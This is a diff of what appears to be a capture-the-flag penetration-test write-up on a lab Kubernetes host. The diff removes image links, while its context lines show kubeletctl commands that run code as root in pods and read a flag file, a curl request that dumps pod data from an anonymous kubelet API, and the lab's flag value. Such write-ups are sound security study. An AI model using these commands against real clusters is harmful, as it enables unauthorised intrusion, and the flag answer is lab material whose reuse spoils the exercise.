@@ -268,8 +268,6 @@ kubeletctl --server 10.129.96.167 exec "id" -p nginx -c nginx
 → uid=0(root) gid=0(root) groups=0(root)
 ```
 
-`./images/api.png`, `./images/executable?.png`
-
 ---
 
 ### 2. Container Escape / Host Compromise via Over-Permissioned Service Account — Critical
@@ -297,8 +295,6 @@ kubeletctl exec "cat /root/root/root.txt" -p nginxt -c nginxt
 → b842e278adaacdf6ade647715783aac5
 ```
 
-`./images/all_perms.png`, `./images/creating_pod.png`, `./images/flags.png`
-
 ---
 
 ### 3. Kubelet API Exposes Full Cluster and Pod Configuration to Anonymous Users — High
@@ -320,7 +316,6 @@ curl https://10.129.96.167:10250/pods -k
 → {"kind":"PodList","apiVersion":"v1", ... etcd-steamcloud, kube-apiserver-steamcloud, ...}
 ```
 
-`./images/api.png`, `./images/pods.png`
 
 ---
 
